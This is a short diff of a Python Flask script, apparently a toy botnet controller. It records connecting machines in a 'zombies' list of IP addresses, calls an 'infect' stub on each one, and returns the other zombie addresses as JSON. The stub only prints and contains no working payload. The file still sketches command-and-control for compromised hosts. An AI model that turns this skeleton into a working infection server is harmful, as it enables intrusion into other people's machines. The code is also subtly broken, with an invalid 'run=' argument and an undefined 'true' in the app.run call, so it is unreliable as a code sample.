@@ -1,5 +1,5 @@
-from flask import Flask, request
-
+from flask import Flask, request, Response
+import os, json
 app = Flask(__name__)
 zombies = ["192.168.10.5", "10.104.12.10"]
 
@@ -9,15 +9,14 @@ def register_machine():
     if request.remote_addr not in zombies:
         zombies.append(request.remote_addr)
         for item in zombies:
-            send_list(zombies)
-    else:
-        print("Already infected")
-    return "hello world"
+            infect(item)
+    response = zombies.copy()
+    response.remove(request.remote_addr)
+    return Response(json.dumps({"IP": request.remote_addr, "Zombies": response}), 200)
 
-def send_list(ip):
+def infect(ip):
     print(ip)
 
 
 if __name__ == '__main__':
     app.run(run="0.0.0.0",debug=true)
-    register_machine()
